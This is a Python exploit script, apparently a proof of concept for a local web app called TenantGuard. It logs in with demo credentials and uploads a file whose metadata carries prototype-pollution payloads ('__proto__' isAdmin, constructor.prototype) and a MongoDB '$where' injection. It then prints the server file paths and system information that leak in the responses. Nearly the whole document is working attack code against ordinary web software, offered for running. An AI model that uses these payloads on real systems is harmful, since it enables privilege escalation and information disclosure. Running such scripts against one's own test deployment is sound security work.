#!/usr/bin/env python3

import requests
import json
import os

BASE_URL = "http://localhost:5000"

def exploit_file_path_exposure():
    login_data = {"email": "demo@tenantguard.com", "password": "demo123"}
    response = requests.post(f"{BASE_URL}/api/auth/login", json=login_data)
    token = response.json().get('token')
    headers = {"Authorization": f"Bearer {token}"}
    
    print("[+] Testing file path exposure vulnerabilities...")
    
    # Test 1: File path exposure via upload
    print("\n[1] Testing file path exposure in upload response...")
    
    with open('test_file.txt', 'w') as f:
        f.write('Test content for path exposure')
    
    malicious_metadata = {
        "__proto__": {"isAdmin": True},
        "$where": "this.userId == null",
        "constructor": {"prototype": {"polluted": True}}
    }
    
    with open('test_file.txt', 'rb') as f:
        files = {'file': ('test_file.txt', f, 'text/plain')}
        data = {
            'title': 'Test Document',
            'description': 'Testing path exposure',
            'metadata': json.dumps(malicious_metadata)
        }
        
        upload_response = requests.post(
            f"{BASE_URL}/api/documents/upload",
            headers=headers,
            files=files,
            data=data
        )
    
    if upload_response.status_code == 201:
        result = upload_response.json()
        
        print("[!] FILE PATH EXPOSURE CONFIRMED")
        print(f"    Server Path: {result.get('serverPath')}")
        print(f"    System Info: {result.get('systemInfo')}")
        
        document_id = result.get('document', {}).get('_id')
        
        # Test 2: Retrieve document to see stored path
        print("\n[2] Testing stored file path in document data...")
        doc_response = requests.get(
            f"{BASE_URL}/api/documents/{document_id}",
            headers=headers
        )
        
        if doc_response.status_code == 200:
            doc_data = doc_response.json()
            print("[!] STORED FILE PATH EXPOSED")
            print(f"    File Path: {doc_data.get('filePath')}")
    
    # Cleanup
    if os.path.exists('test_file.txt'):
        os.remove('test_file.txt')
    
    return True

if __name__ == "__main__":
    exploit_file_path_exposure()